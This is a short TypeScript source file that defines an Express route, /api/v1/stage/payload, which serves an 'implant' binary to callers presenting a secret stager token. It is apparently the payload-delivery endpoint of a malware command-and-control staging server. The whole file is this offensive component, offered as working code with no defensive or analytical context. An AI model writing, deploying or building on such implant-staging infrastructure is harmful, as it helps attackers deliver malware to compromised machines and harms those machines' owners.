import { Router } from "express";
import { readFileSync, existsSync } from "node:fs";

export function createStagerRouter(implantPath: string, stagerToken: string): Router {
  const router = Router();

  router.get("/api/v1/stage/payload", (req, res) => {
    const token = req.headers["x-stager-token"] as string | undefined;
    if (!token || token !== stagerToken) {
      res.status(403).json({ error: "invalid stager token" });
      return;
    }

    if (!implantPath || !existsSync(implantPath)) {
      res.status(503).json({ error: "payload not available" });
      return;
    }

    const data = readFileSync(implantPath);
    res.set("Content-Type", "application/octet-stream");
    res.set("Content-Length", String(data.length));
    res.end(data);
  });

  return router;
}
